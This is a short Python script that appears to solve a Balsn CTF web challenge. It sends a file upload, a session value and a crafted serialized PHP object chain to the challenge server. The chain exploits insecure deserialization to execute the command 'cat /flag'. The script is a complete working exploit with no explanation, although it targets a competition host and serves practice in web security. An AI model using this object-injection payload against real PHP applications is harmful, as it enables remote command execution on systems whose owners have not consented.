import requests

img = open('image.jpg', 'rb').read()

files = {
    'l5d_file': (img),
    '_SESSION': ('wubalubadubdub', '')
}

cookie = {
    'PHPSESSID': 'L3o'
}

def solve(payload):
    url = f'http://l5d.balsnctf.com:12345/?%3f={payload}'
    res = requests.post(url, cookies=cookie, files=files)
    print(res.text)

if __name__ == '__main__':
	solve('O:10:"L5D_Upload":1:{s:1:"x";O:12:"L5D_ResetCMD":2:{S:10:"\00\\2a\00new_cmd";s:9:"cat /flag";s:1:"x";O:11:"L5D_Command":0:{}}}')